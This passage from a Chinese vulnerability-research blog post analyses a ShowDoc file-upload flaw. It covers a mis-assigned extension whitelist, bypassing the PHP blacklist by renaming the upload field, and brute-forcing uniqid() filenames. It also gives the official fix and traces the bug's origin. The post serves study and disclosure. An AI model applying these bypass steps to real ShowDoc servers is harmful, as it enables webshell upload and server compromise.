class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//漏洞版本：showdoc\server\Application\Home\Controller\PageController.class.php</span><br><br>strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br><br><span class="hljs-comment">//另外一个路径下的修复版本：showdoc\server\Application\Api\Controller\PageController.class.php</span><br><br>strstr(strip_tags(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])), <span class="hljs-string">&quot;.php&quot;</span>) <br></code></pre></td></tr></table></figure><h3 id="4-2-4-追问：不是后面还会进行白名单检测吗？"><a href="#4-2-4-追问：不是后面还会进行白名单检测吗？" class="headerlink" title="4.2.4 追问：不是后面还会进行白名单检测吗？"></a>4.2.4 追问：不是后面还会进行白名单检测吗？</h3><blockquote><p>重头戏，这个引发后续一系列问题！</p></blockquote><p>虽然前面绕过了黑名单检测，但是后面还有白名单检测，那么这里怎么绕过的呢？</p><p>赋值问题：后缀的白名单数组赋值给了upload类中的<code>allowExts</code>变量：<code>$upload-&gt;allowExts = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> ，但是检测文件名后缀的时候使用upload类中的<code>exts</code>变量：<code>$this-&gt;config[&#39;exts&#39;]</code> ，错付了值，显而易见，exts变量为空，故绕过了后缀名的check。</p><p>这是开发者在开发时疏漏导致的白名单检测缺陷，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> 即可修复</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2015.png"></p><h2 id="4-3-绕过方法二：修改输入名称"><a href="#4-3-绕过方法二：修改输入名称" class="headerlink" title="4.3 绕过方法二：修改输入名称"></a>4.3 绕过方法二：修改输入名称</h2><h3 id="4-3-1-绕过方式"><a href="#4-3-1-绕过方式" class="headerlink" title="4.3.1 绕过方式"></a>4.3.1 绕过方式</h3><p>将文件输入名称改为<code>editormd-image-file1</code>，如  <code>name=&quot;editormd-image-file1&quot;; filename=&quot;test.php&quot;</code> </p><h3 id="4-3-2-原理"><a href="#4-3-2-原理" class="headerlink" title="4.3.2 原理"></a>4.3.2 原理</h3><p>因为他只检测输入名为<code>editormd-image-file</code> 文件的文件名是否包含php，修改对应的输入名即可。通过此方式同样绕过了黑名单的检测，结合白名单的缺陷，以实现目的</p><p><strong>举一反三</strong>：这也解释了为什么其他场景的文件上传中可以通过修改这个字段名称的方式绕过了文件上传限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="4-3-3-缺陷"><a href="#4-3-3-缺陷" class="headerlink" title="4.3.3 缺陷"></a>4.3.3 缺陷</h3><p>虽然在文件夹中看到文件成功上传，但是返回的文件路径中没有文件名</p><p>查看源码后发现：是因为在返回的文件名中又一次使用到了<code>editormd-image-file</code> ，并通过这个名来获取文件保存路径。由于我们更改了输入名，并不存在<code>editormd-image-file</code> 的键值，故返回了文件名为空。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2016.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2017.png"></p><h3 id="4-3-4-进一步绕过"><a href="#4-3-4-进一步绕过" class="headerlink" title="4.3.4 进一步绕过"></a>4.3.4 进一步绕过</h3><p>虽然没有返回文件名，但是文件是上传成功的，那么如何知道上传后的文件名？</p><p>跟踪源码，发现文件命名调用了<code>uniqid()</code> 函数，而该函数的定义是基于以微秒计的当前时间，生成一个唯一的 ID。根据函数的定义，那么在极短的时间内发送两个包，那么文件名应该是相近的。</p><p>方法一：第一个正常上传返回路径，第二个修改输入名不返回路径，依据时间递增遍历即可找到，但是爆破不知上限有些盲目。</p><p>方法二：php文件在两个包之间，对应文件名也在两个包时间之间。如下图，需要爆破5位数</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2018.png"></p><h3 id="4-3-5-更进一步"><a href="#4-3-5-更进一步" class="headerlink" title="4.3.5 更进一步"></a>4.3.5 更进一步</h3><p>通过查看<a href="http://document.thinkphp.cn/manual_3_2.html#upload">thinkphp文档</a>后发现，其支持多文件上传。测试后多文件上传后，发现文件处理时间间隔更近，命名更相似，3位数，对应爆破次数不超过4000次，效率更高。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2019.png"></p><h2 id="4-4-官方修复方案"><a href="#4-4-官方修复方案" class="headerlink" title="4.4 官方修复方案"></a>4.4 官方修复方案</h2><p>修复白名单赋值导致的缺陷即可，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code></p><p><a href="https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd">https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2020.png"></p><h2 id="4-5-其他失败尝试"><a href="#4-5-其他失败尝试" class="headerlink" title="4.5 其他失败尝试"></a>4.5 其他失败尝试</h2><h3 id="4-5-1-直接上传php"><a href="#4-5-1-直接上传php" class="headerlink" title="4.5.1 直接上传php"></a>4.5.1 直接上传php</h3><p><strong>原因</strong>：最早跟踪&lt;&gt;的漏洞成因，发现是白名单后缀检测失效导致的，既然白名单失效，为什么不考虑直接上传php</p><p><strong>过程</strong>：测试失败，然后下断点跟踪代码。</p><p><strong>收获</strong>：发现了其还有一层黑名单验证机制</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2021.png"></p><h3 id="4-5-2-strlower通过Unicode字符绕过"><a href="#4-5-2-strlower通过Unicode字符绕过" class="headerlink" title="4.5.2 strlower通过Unicode字符绕过"></a>4.5.2 strlower通过Unicode字符绕过</h3><p>原因：最近打<a href="https://blog.csdn.net/wanmiqi/article/details/117044715">CISCN2021</a>的一道upload题目，遇到在<code>strtolower</code> 进行黑名单匹配时可通过unicode绕过</p><p><strong>过程</strong>：仔细查看后发现我记错了，CTF中题目是<code>mb_strtolowe</code>r，而此处是<code>strtolower</code></p><p><strong>收获</strong>：对<code>strtolower</code>和<code>mb_strtolower</code>理解更深</p><h3 id="4-5-3-htaccess绕过"><a href="#4-5-3-htaccess绕过" class="headerlink" title="4.5.3 .htaccess绕过"></a>4.5.3 .htaccess绕过</h3><p><strong>背景</strong>：黑名单只限制php，phtml可以上传，但无法被解析，那么可以上传<code>.htaccess</code>使之支持解析吗？</p><p><strong>过程</strong>：测试，发现上传的<code>.htaccess</code> 会被重命名为<code>60d150f6ee711.htaccess</code></p><p><strong>结局</strong>：不再发散，点到为止</p><h1 id="5-有趣的溯源"><a href="#5-有趣的溯源" class="headerlink" title="5. 有趣的溯源"></a>5. 有趣的溯源</h1><h2 id="5-1-漏洞起源于CTF"><a href="#5-1-漏洞起源于CTF" class="headerlink" title="5.1 漏洞起源于CTF"></a>5.1 漏洞起源于CTF</h2><ol><li>plzmyy师傅最早通报这个漏洞给<a href="https://github.com/star7th/showdoc/pull/1059%E3%80%82">showdoc官方</a>在2020年的八月</li><li>plzmyy师傅提到了最早出现在RoarCTF2019的赛事中的simple_upload题目<a href="https://www.fuzzer.xyz/2019/10/14/RoarCTF2019">Ethan师傅的WP</a></li><li>Ethan师傅发现&lt;&gt;绕过方法是fuzz出来这个非预期解，而查看绝大部分WP以及<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/simple_upload/writeup">疑似官方的WP</a>中介绍的是利用uniqid()的函数可爆破的点，似乎没注意到这个非预期解。</li><li>Ethan师傅文章中提到疑似0day，引起了我的兴趣，我想分析到底是哪个day？</li></ol><h2 id="5-2-疑似0day"><a href="#5-2-疑似0day" class="headerlink" title="5.2 疑似0day"></a>5.2 疑似0day</h2><ol><li>检索相关关键词，没有发现0day，而且到现在都没有爆出来，离谱！更加吸引了我的兴趣</li><li>搜索引擎限定搜索时间为19年10月RoarCTF开赛之前，发现一个14的<a href="https://www.jb51.net/article/54209.htm">《ThinkPHP文件上传实例教程》</a>一个15年的<a href="http://www.splaybow.com/post/thinkphp-file-upload-sample.html">《ThinkPHP文件上传的实例代码》</a>网页介绍了如何使用ThinkPHP文件上传 ，其使用的方法就是<code>$upload-&gt;allowExts</code>错误的写法，而ThinkPHP官方3.2版本的<a href="http://document.thinkphp.cn/manual_3_2.html#upload">说明文档</a>中则使用的是正确的<code>$upload-&gt;exts</code>写法</li><li>那么为什么ThinkPHP官方是对的，而民间大家用的是这种错误的写法？会不会是官方早期版本教学用的就是这个错误的写法？</li></ol><h2 id="5-3-官方自相矛盾吗"><a href="#5-3-官方自相矛盾吗" class="headerlink" title="5.3 官方自相矛盾吗"></a>5.3 官方自相矛盾吗</h2><ol><li>怀疑是ThinkPHP3.2以下版本的官方文档自身用了错误的写法，而民间只是历史沿用这一用法，搜了<a href="http://www.thinkphp.cn/info/194.html">ThinkPHP3.1的说明文档</a>，果不其然用的就是<code>$upload-&gt;allowExts</code> 的错误方式</li><li>那么TP3.2官方为什么在文档中更正TP3.1中的错误的写法？是因为当时爆出了漏洞吗？遗憾的是检索后发现TP3.1并没有爆出这类漏洞</li><li>继续追踪，查看3.1和3.2官方源码发现：是在TP从3.1到3.2版本升级的时候，由于编写文件上传类的负责人换了<code>liu21st</code>→<code>zuojiazi</code>，使得①类名<code>UploadFile()</code> →<code>Upload()</code>②白名单后缀数组名<code>allowExts</code> → <code>ext</code>③文件名，文件路径等发生变更。</li><li>仔细对比3.1和3.2的文档，发现虽然源码发生改变，但对应的教学文档也发生了相应的改变，本质上并不存在漏洞。</li><li>也就说①3.1版本的源码配合3.1的文档，<code>$upload = new UploadFile()</code>搭配<code>$upload-&gt;allowExts</code>不会产生漏洞；②3.2版本的源码配合3.2的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;exts</code>也不会发生漏洞。③但是3.2的版本使用3.1的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;allowExts</code>就会产生漏洞，而showdoc的漏洞成因很大几率来源于此。</li><li>再次百度、Google相关教程网页，发现民间教程也都和官方文档一样，一一对应（刚刚只关注键名的不同没关注类名的不同，误会民间教程了）。</li><li>也就说官方教程不存在问题，网上教程也不存在问题，如showdoc官方案例这种错赋值的写法并未检索到，那么只能是个人了！</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2023.png"></p><h2 id="5-4-大结局：个人问题"><a href="#5-4-大结局：个人问题" class="headerlink" title="5.4 大结局：个人问题"></a>5.4 大结局：个人问题</h2><ol><li>真的是个人问题吗？</li><li>再往前追：2016年8月showdocV1.0.0版本就存在<a href="https://github.com/star7th/showdoc/blob/v1.0.0/Application/Home/Controller/PageController.class.php">这种错误的写法</a>，但是14年TP3.2就出现了</li><li>由于两个作品发布前后间隔两年，首先怀疑作者是基于一个通用模板或CMS改的，但是检索了半天开源框架并没有发现类似案例。</li><li>其次只能怀疑是面向百度编程的通病：①百度内容②发现官网文档③发现demo，但是运行失败③魔改一番，手动将类名由uploadfile改为upload⑤程序运行成功⑥不影响正常业务⑦大功告成！</li><li>我按照这个步骤复现之后发现很类似，最后和作者取得联系，和怀疑的基本差不多。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2024.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2025.png"></p><h2 id="5-5-时间线"><a href="#5-5-时间线" class="headerlink" title="5.5 时间线"></a>5.5 时间线</h2><p>2013年06月07日：ThinkPHP3.1.3发布，使用<code>UploadFile()-&gt;allowExts</code></p><p>2014年02月03日：ThinkPHP3.2 发布，使用<code>Upload()-&gt;exts</code></p><p>2016年08月07日：showdocV1.0.0发布 ，使用<code>UploadFile()-&gt;exts</code> </p><p>2019年10月12日：RoarCTF开赛，并于14日Ethan师傅Fuzz出了这个点，但其未深究</p><p>2020年08月12日：plzmyy师傅根据Ethan师傅的WP发现showDoc的漏洞</p><h2 id="5-6-总结"><a href="#5-6-总结" class="headerlink" title="5.6 总结"></a>5.6 总结</h2><p>溯源到最后，可以说showdoc是个特例，是由于开发者的一时疏忽导致的。诚然在这个里面个人开发者占很大的问题，但也希望给厂商企业敲响一个警钟，在版本升级时不仅要注意文档和代码的对应性，也需要在更改类的字段名时候慎重考虑。</p><p>对于Ethan师傅也有点可惜，他觉得是个0day，但未深究跟踪一下代码，也许他就真的发现了一个0day。</p><p>对于CTFer来说，也需要多看WP，也许能收获到不同的东西</p><p>对于面向百度编程的我，也需要警惕不要做一个盲目CV的代码首席移动工程师。</p><h1 id="6-大总结"><a href="#6-大总结" class="headerlink" title="6. 大总结"></a>6. 大总结</h1><p>从一个文件上传1day的复现开始，到用Goby简单的GUI编写POC&amp;EXP，再到不满足需求，于是选择用Go语言编写，并且使用Goby自带API不断优化POC，最终实现一键反弹shell。不仅学习了Go，也对EXP进一步的完善。</p><p>代码审计，从一个为什么产生出发，不断地问自己问题，虽然是一次简单的代审，延伸出一次溯源，最后的收获远不止一次代码审计，不可思议的是我的总结居然升华到了人。</p><p>正如Zwell说的“不断问自己问题”的学习方法，随着不停的问自己问题，记录下问题解决它，好奇心吸引着我，最后抵达了一个新的高度，共勉！</p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>POC编写</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
